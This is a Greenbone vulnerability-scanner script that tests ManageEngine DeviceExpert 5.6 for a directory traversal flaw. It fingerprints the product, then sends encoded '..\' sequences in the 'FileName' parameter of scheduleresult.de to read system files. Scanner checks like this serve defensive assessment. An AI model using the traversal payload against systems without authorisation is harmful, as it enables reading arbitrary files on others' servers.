if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802720" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 52559 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-03-20 15:57:28 +0530 (Tue, 20 Mar 2012)" );
	script_name( "Zoho ManageEngine Device Expert Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/48456/" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/522004" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/110985/manageenginede56-traversal.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 6060 );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation could allow remote attackers to perform
  directory traversal attacks and read arbitrary files on the affected
  application." );
	script_tag( name: "affected", value: "ManageEngine DeviceExpert version 5.6" );
	script_tag( name: "insight", value: "The flaw is due to an input validation error in 'FileName'
  parameter to 'scheduleresult.de', which allows attackers to read arbitrary
  files via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Zoho ManageEngine Device Expert and is
  prone to directory traversal vulnerability." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 6060 );
sndReq = http_get( item: "/NCMContainer.cc", port: port );
rcvRes = http_keepalive_send_recv( port: port, data: sndReq );
if(rcvRes && ContainsString( rcvRes, ">ManageEngine DeviceExpert<" )){
	files = traversal_files();
	for file in keys( files ) {
		attack = NASLString( "/scheduleresult.de/?FileName=", crap( data: "..%5C", length: 3 * 15 ), files[file] );
		req = http_get( item: attack, port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(!res){
			continue;
		}
		if(res && ( egrep( pattern: file, string: res ) )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

